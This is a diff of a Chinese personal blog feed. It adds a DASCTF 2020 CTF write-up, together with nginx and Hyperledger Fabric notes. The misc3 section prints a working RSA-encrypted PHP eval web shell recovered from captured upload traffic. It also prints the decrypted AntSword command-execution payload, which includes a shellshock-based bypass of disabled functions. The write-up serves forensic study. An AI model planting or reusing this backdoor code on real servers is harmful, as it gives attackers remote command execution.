@@ -8,39 +8,61 @@
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc1-bluetooth"><a href="#misc1-bluetooth" class="headerlink" title="misc1(bluetooth)"></a>misc1(bluetooth)</h3><p>流量包分析，文件提取</p>
 <p>首先拿到这道题，没啥思路，那堆协议也没见过，尝试binwalk一下，发现一个7z压缩包，用dd命令提取出来</p>
 <p>发现里面的文本名称是<code>password_is_Bluetooth_PIN.txt</code>，然后就去流量包里找</p>
-<a href="/2020/04/25/DASCTF-2020-April/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/25/DASCTF-2020-April/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/25/DASCTF-2020-April/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>找到后解开压缩包，就得到flag了</p>
 <h3 id="misc2-keyboard"><a href="#misc2-keyboard" class="headerlink" title="misc2(keyboard)"></a>misc2(keyboard)</h3><p>vol文件提取、电脑键盘QWE密码、大小写转换、VeraCrypt文件挂载、NTFS</p>
 <p>下载得到两个文件，感觉很熟悉，有、像<code>1st XTUCTF</code>里面的一道取证，不过不太一样</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f Keyboard.raw imageinfo</span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 pslist  <span class="comment">#查看进程，发现VeraCrypt.exe和keyboard-log.exe</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 filescan | grep keyboard  <span class="comment">#扫一下发现t.txt</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 --dump-dir=./ <span class="comment">#提取一下</span></span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/04/25/DASCTF-2020-April/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>然后通过下图解密给出的<code>CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA</code></p>
-<a href="/2020/04/25/DASCTF-2020-April/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到<code>VERACRYPTPASSWORDISKEYBOARDDRAOBYEK</code>，提示小写更容易看出<code>veracryptpasswordiskeyboarddraobyek</code></p>
 <p>得到密码<code>keyboarddraobyek</code>，但是下面提示还是要大写。。。</p>
-<a href="/2020/04/25/DASCTF-2020-April/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>拿VeraCrypt.exe加载一下Secret</p>
-<a href="/2020/04/25/DASCTF-2020-April/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/5.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/5.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>猜一手NTFS，拿NtfsStreamsEditor2.exe扫一下，或者用dir命令</p>
-<h3 id="misc3-AWDshell"><a href="#misc3-AWDshell" class="headerlink" title="misc3(AWDshell)"></a>misc3(AWDshell)</h3><p>明天起来写</p>
+<h3 id="misc3-AWDshell"><a href="#misc3-AWDshell" class="headerlink" title="misc3(AWDshell)"></a>misc3(AWDshell)</h3><p>流量分析、RSA、AES、php代码大概审计</p>
+<p>这是夏风师傅出的一道上传🐎的题（<a href="https://blog.xiafeng2333.top/ctf-18/" target="_blank" rel="noopener">出题思路</a></p>
+<p>首先打开流量包发现一堆UDP，里面混淆着HTTP，追踪一下HTTP流</p>
+<p>先在导出对象里看一下都有啥，然后把名字熟悉的，比如login.php、upload.php、index.php啥的</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/25/DASCTF-2020-April/6.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>在upload.php里面发现下面代码、发现是一个用蚁剑连接的、RSA加密的🐎</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------------------7e42cb506f4</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;pic&quot;; filename&#x3D;&quot;awdshell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; @$_POST[&#39;ant&#39;];</span><br><span class="line">$pk &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds &#x3D; explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$cmd &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval($cmd);</span><br></pre></td></tr></table></figure></div>
+
+<p>然后追踪<code>1581335771.php</code>的一堆流量，在里面发现了上传的<code>name=&quot;ant&quot;</code></p>
+<p>将上面代码里的<code>$cmd=@$_POST[&#39;ant&#39;];</code>改成上传的<code>ant</code>的值，放到一个php环境里，把上面的代码跑一下，会得到<code>ant</code>解密后的值（一串php代码</p>
+<p>其实有很多上传的<code>1581335771.php</code>文件，需要一个一个去分析</p>
+<p>但是重要的只有两个函数：<code>asenc()</code>、<code>asoutput()</code></p>
+<p>其中第一个函数<code>asenc()</code>指明了AES的密钥session的前16位，也就是<code>Cookie: PHPSESSID=hm3pq66843bbbrdgphntt8fmc4</code>的前16位</p>
+<p>第二个函数<code>asoutput()</code>给出了AES的密文，但是是混淆过后的，因为它前面和后面都有一些没有用的字符串</p>
+<p>我下面就放出了其中一个解密结果，流38解密后的php代码段，就是有用的那一个</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span> </span>&#123;</span><br><span class="line">	@session_start();</span><br><span class="line">	$key=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"f3c7239848e0"</span>;</span><br><span class="line">	<span class="keyword">echo</span> @asenc($output);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"05fda2646c"</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$p=base64_decode($_POST[<span class="string">"t185a78b977a47"</span>]);</span><br><span class="line">	$s=base64_decode($_POST[<span class="string">"wd0b7c7ca226cb"</span>]);</span><br><span class="line">	$envstr=@base64_decode($_POST[<span class="string">"b8dcb72ce2ba93"</span>]);</span><br><span class="line">	$d=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">	$c=substr($d,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">"/"</span>?<span class="string">"-c \"&#123;$s&#125;\""</span>:<span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">	<span class="keyword">if</span>(substr($d,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">"/"</span>) &#123;</span><br><span class="line">		@putenv(<span class="string">"PATH="</span>.getenv(<span class="string">"PATH"</span>).<span class="string">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		@putenv(<span class="string">"PATH="</span>.getenv(<span class="string">"PATH"</span>).<span class="string">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($envstr)) &#123;</span><br><span class="line">		$envarr=explode(<span class="string">"|||asline|||"</span>, $envstr);</span><br><span class="line">		<span class="keyword">foreach</span>($envarr <span class="keyword">as</span> $v) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($v)) &#123;</span><br><span class="line">				@putenv(str_replace(<span class="string">"|||askey|||"</span>, <span class="string">"="</span>, $v));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$r=<span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fe</span><span class="params">($f)</span> </span>&#123;</span><br><span class="line">		$d=explode(<span class="string">","</span>,@ini_get(<span class="string">"disable_functions"</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($d)) &#123;</span><br><span class="line">			$d=<span class="keyword">array</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$d=array_map(<span class="string">'trim'</span>,array_map(<span class="string">'strtolower'</span>,$d));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span><span class="params">($d, $c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> &amp;&amp; fe(<span class="string">'putenv'</span>) &amp;&amp; (fe(<span class="string">'error_log'</span>) || fe(<span class="string">'mail'</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				$tmp = tempnam(sys_get_temp_dir(), <span class="string">'as'</span>);</span><br><span class="line">				putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">				<span class="keyword">if</span> (fe(<span class="string">'error_log'</span>)) &#123;</span><br><span class="line">					error_log(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					mail(<span class="string">"a@127.0.0.1"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"-bv"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$output = @file_get_contents($tmp);</span><br><span class="line">			@unlink($tmp);</span><br><span class="line">			<span class="keyword">if</span> ($output != <span class="string">""</span>) &#123;</span><br><span class="line">				<span class="keyword">print</span>($output);</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span> </span>&#123;</span><br><span class="line">		$ret=<span class="number">0</span>;</span><br><span class="line">		$d=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">		<span class="keyword">if</span>(fe(<span class="string">'system'</span>)) &#123;</span><br><span class="line">			@system($c,$ret);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">			@passthru($c,$ret);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">			<span class="keyword">print</span>(@shell_exec($c));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">			@exec($c,$o,$ret);</span><br><span class="line">			<span class="keyword">print</span>(join(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>,$o));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">			$fp=@popen($c,<span class="string">'r'</span>);</span><br><span class="line">			<span class="keyword">while</span>(!@feof($fp)) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($fp,<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@pclose($fp);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'proc_open'</span>)) &#123;</span><br><span class="line">			$p = @proc_open($c, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">'pipe'</span>, <span class="string">'w'</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">'pipe'</span>, <span class="string">'w'</span>)), $io);</span><br><span class="line">			<span class="keyword">while</span>(!@feof($io[<span class="number">1</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($io[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(!@feof($io[<span class="number">2</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($io[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@fclose($io[<span class="number">1</span>]);</span><br><span class="line">			@fclose($io[<span class="number">2</span>]);</span><br><span class="line">			@proc_close($p);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'antsystem'</span>)) &#123;</span><br><span class="line">			@antsystem($c);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(runshellshock($d, $c)) &#123;</span><br><span class="line">			<span class="keyword">return</span> $ret;</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(substr($d,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">"/"</span> &amp;&amp; @class_exists(<span class="string">"COM"</span>)) &#123;</span><br><span class="line">			$w=<span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);</span><br><span class="line">			$e=$w-&gt;exec($c);</span><br><span class="line">			$so=$e-&gt;StdOut();</span><br><span class="line">			$ret.=$so-&gt;ReadAll();</span><br><span class="line">			$se=$e-&gt;StdErr();</span><br><span class="line">			$ret.=$se-&gt;ReadAll();</span><br><span class="line">			<span class="keyword">print</span>($ret);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ret = <span class="number">127</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $ret;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	$ret=@runcmd($r.<span class="string">" 2&gt;&amp;1"</span>);</span><br><span class="line">	<span class="keyword">print</span> ($ret!=<span class="number">0</span>)?<span class="string">"ret=&#123;$ret&#125;"</span>:<span class="string">""</span>;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR://"</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></div>
+
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/25/DASCTF-2020-April/7.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>把前后没用的附加字符去掉，在线网页AES+base64*2</p>
+<p>或者</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$key = <span class="string">"hm3pq66843bbbrdg"</span>;</span><br><span class="line">$out = <span class="string">"+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4="</span>;</span><br><span class="line">$out1 = base64_decode($out);</span><br><span class="line">$out2 = openssl_decrypt($out1, <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA);</span><br><span class="line"><span class="keyword">echo</span> base64_decode(base64_decode($out2));</span><br></pre></td></tr></table></figure></div>
+
 <h3 id="misc4-6G！签到题目"><a href="#misc4-6G！签到题目" class="headerlink" title="misc4(6G！签到题目)"></a>misc4(6G！签到题目)</h3><p>这个题出的有意思，哈哈哈哈，给个1G文件，下载速度还奇慢</p>
 <p>下载一部分就好了，有<code>crdownload</code>文件生成后，直接放010就好，文件头部发现DSACTF</p>
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1-Joomla-3-4-6-RCE"><a href="#web1-Joomla-3-4-6-RCE" class="headerlink" title="web1(Joomla 3.4.6 RCE)"></a>web1(Joomla 3.4.6 RCE)</h3><p>明天起来写</p>
-<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>会了就写</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1-Joomla-3-4-6-RCE"><a href="#web1-Joomla-3-4-6-RCE" class="headerlink" title="web1(Joomla 3.4.6 RCE)"></a>web1(Joomla 3.4.6 RCE)</h3><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>会了就写</p>
 ]]></content>
       <categories>
         <category>Write_up</category>
       </categories>
       <tags>
         <tag>Write_up</tag>
-        <tag>Web</tag>
         <tag>misc</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -91,10 +113,10 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">        listen 80; </span><br><span class="line">        server_name www.域名; </span><br><span class="line">        return 301 https:&#x2F;&#x2F;$server_name$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($scheme &#x3D; http ) &#123;return 301 https:&#x2F;&#x2F;$host$request_uri;&#125;</span><br><span class="line"></span><br><span class="line">if ($server_port &#x3D; 80 ) &#123;return 301 https:&#x2F;&#x2F;$host$request_uri;&#125;</span><br><span class="line"></span><br><span class="line">if ($ssl_protocol &#x3D; &quot;&quot;) &#123; return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125;if ($host !&#x3D; 域名) &#123; return 301 $scheme:&#x2F;&#x2F;域名$request_uri; &#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>还是不行！！我就奇了怪了，还一直warn，好好读了一遍代码，发现了这句代码</p>
-<a href="/2020/04/16/Http-301/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>其实除了conf.d还有两个文件夹里面的*.conf也被包含了，检查一下，艹，罪恶之源</p>
-<a href="/2020/04/16/Http-301/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>删了，重启nginx，搞定。。</p>
 <p>我还是特想吐槽浏览器的缓存。。我在Edge和Chrome里访问http还是不跳转，在firefox和移动端都可以了。。</p>
@@ -128,13 +150,13 @@
 
 <p>3、执行bootstrap.sh下载镜像和二进制文件：<code>./bootstrap.sh</code></p>
 <p>会发现</p>
-<a href="/2020/04/16/HyperLedger-Fabric/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>卡在这，所以<code>vim bootstrap.sh</code>，将 <strong>binariesInstall</strong> 屏蔽后再执行</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$BINARIES</span>"</span> == <span class="string">"true"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Pull Hyperledger Fabric binaries"</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="comment">#pullBinaries</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>
 
 <p>执行结果如下，执行完之后会发现在目录下创建了fabric-samples文件夹</p>
-<a href="/2020/04/16/HyperLedger-Fabric/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>然后把从网上下载的<code>hyperledger-fabric-linux-amd64-2.0.0.tar.gz</code>解压到这个目录下面</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf hyperledger-fabric-linux-amd64-2.0.0.tar.gz</span><br></pre></td></tr></table></figure></div>
@@ -143,12 +165,12 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;scripts&#x2F;fabric-samples&#x2F;test-network</span><br><span class="line">.&#x2F;network.sh up</span><br></pre></td></tr></table></figure></div>
 
 <p>如图，表示启动成功，已启动一个orderer节点和两个peer节点。</p>
-<a href="/2020/04/16/HyperLedger-Fabric/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="使用测试网络"><a href="#使用测试网络" class="headerlink" title="使用测试网络"></a>使用测试网络</h3><p>1、创建channel，使用network.sh脚本创建来创建一个连接org1和org2组织并加入他们peer的通道，命令如下：</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh createChannel</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/04/16/HyperLedger-Fabric/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>创建成功，默认通道名为mychannel</p>
 <p>也可以带上channel标签，命令如下（-c ChannelName）：</p>
@@ -166,7 +188,7 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure></div>
 
 <p>得到下图，启动成功</p>
-<a href="/2020/04/16/HyperLedger-Fabric/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/5.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/5.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>3、与网络互动</p>
 <p>网络启动之后，可以使用peer cli客户端去操作网络，可以通过cli客户端去调用部署智能合约，更新通道，或者安装和部署新的智能合约。</p>
@@ -185,14 +207,14 @@
     <url>/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/</url>
     <content><![CDATA[<p>人傻了，开这篇博客之前以为这就是场恶战。。没想到呀。。。好吧还行。。好多SQL。。。而且咋都变成1分了。。</p>
 <h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>万能密码，登录得到flag</p>
-<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" src="/img/loading.gif" class="lazyload"></a>
 
